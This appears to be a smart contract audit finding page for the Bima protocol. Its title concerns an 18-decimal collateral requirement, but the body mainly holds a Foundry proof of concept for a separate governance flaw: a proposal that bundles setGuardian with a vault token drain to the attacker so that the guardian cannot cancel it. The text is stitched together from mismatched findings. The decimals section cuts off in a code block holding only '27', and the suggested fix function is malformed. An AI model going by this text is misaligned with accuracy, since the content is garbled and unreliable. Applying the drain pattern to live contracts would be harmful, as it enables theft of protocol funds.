# Factory\u0027s 18 Decimal Requirement Breaks Core Functionality by Blocking Intended BTC-based Collateral Tokens - Issue 2

**Severity:** medium
**Auditor:** Cantina
**Protocol:** Bima 
**Keywords:** factory, 18 decimals, requirement, collateral, tokens, BTC, functionality, block, intended, deployNewInstance, core, function, contract, strict, requirement, tokens, decimal, collateralTokens, break, issue

---

# Malicious Proposal Execution
\u0060\u0060\u0060solidity
vm.prank(users.user1);
tokenLocker.lock(users.user1, USER1_TOKEN_ALLOCATION / INIT_LOCK_TO_TOKEN_RATIO, 52);
// Create malicious actions including setGuardian
AdminVoting.Action[] memory maliciousPayload = new AdminVoting.Action[](3);
// First add legitimate looking action
maliciousPayload[0].target = address(adminVoting);
maliciousPayload[0].data = abi.encodeWithSelector(
    AdminVoting.setMinCreateProposalPct.selector,
    UPDT_MIN_CREATE_PROP_PCT  // Using existing test constant
);
// Add setGuardian call anywhere in payload
maliciousPayload[1].target = address(bimaCore);
maliciousPayload[1].data = abi.encodeWithSelector(
    IBimaCore.setGuardian.selector,
    users.user1  // Set attacker (user1) as new guardian
);
// Add malicious action to drain funds
maliciousPayload[2].target = address(bimaVault);
maliciousPayload[2].data = abi.encodeWithSelector(
    IBimaVault.transferTokens.selector,
    bimaToken,  // Token to transfer
    users.user1, // Receiver (attacker)
    USER1_TOKEN_ALLOCATION  // Amount to drain
);
// Warp past bootstrap period
vm.warp(block.timestamp + adminVoting.BOOTSTRAP_PERIOD() + 1);
// Create the malicious proposal
vm.prank(users.user1);
uint256 proposalId = adminVoting.createNewProposal(
    users.user1,
    maliciousPayload
);
// Guardian notices malicious proposal and tries to cancel
vm.prank(users.guardian);
// This should revert because proposal contains setGuardian
vm.expectRevert("Guardian replacement not cancellable");
adminVoting.cancelProposal(proposalId);
// The malicious proposal remains active and can still be executed
// if enough votes are gathered
assertEq(adminVoting.getProposalProcessed(proposalId), false);
\u0060\u0060\u0060
Modify _containsSetGuardianPayload() to only block cancellation for single-action setGuardian proposals:
\u0060\u0060\u0060solidity
function _containsSetGuardianPayload(uint256 payloadLength, Action[] memory payload) {
    if(payloadLength != 1) return false;
    // ...
    // extra code
}
\u0060\u0060\u0060
This ensures the guardian can cancel multi-action proposals even if they include setGuardian.

## Factory\u0027s 18 Decimal Requirement Breaks Core Functionality by Blocking Intended BTC-based Collateral Tokens
Submitted by Spearmint, also found by ladboy233 and Spearmint  
**Severity:** Medium Risk  
**Context:** (No context files were provided by the reviewer)  
**Finding Description:** In the Factory contract\u0027s deployNewInstance function, there is a strict requirement that all collateral tokens must have 18 decimals:
\u0060\u0060\u0060solidity
27
\u0060\u0060\u0060
